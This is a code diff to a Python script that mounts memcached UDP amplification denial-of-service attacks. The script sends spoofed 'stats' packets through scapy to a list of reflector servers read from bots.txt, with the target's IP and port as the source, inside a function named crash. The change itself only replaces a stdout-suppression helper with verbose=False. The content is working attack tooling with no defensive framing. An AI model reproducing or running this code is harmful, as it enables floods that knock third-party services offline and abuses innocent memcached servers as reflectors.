@@ -7,22 +7,13 @@
 # * shodan API is not used, the list of servers should be available in bots.txt
 # * smart scheduling for sending UDP packets
 
-from contextlib import contextmanager, redirect_stdout
 import click
-import os
 from scapy.all import *
 from typing import List
 
 
 MEMCACHED_PORT = 11211
 STATS_PAYLOAD = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-
-
-@contextmanager
-def suppress_stdout():
-    with open(os.devnull, "w") as devnull:
-        with redirect_stdout(devnull):
-            yield
 
 
 def read_bots(filepath:str="./bots.txt") -> List[str]:
@@ -75,8 +66,7 @@ def crash(targets, num_packets, bots_config, repeat):
             for bot in bots:
                 print(f"[+] loop={loop}\ttarget={ip}:{port}\tdest={bot}\tpackets={num_packets}")
                 packet = prepare_packet(dest_ip=bot, dest_port=MEMCACHED_PORT, target_ip=ip, target_port=port)
-                with suppress_stdout():
-                    send(packet, count=num_packets)
+                send(packet, count=num_packets, verbose=False)
 
 
 if __name__ == "__main__":
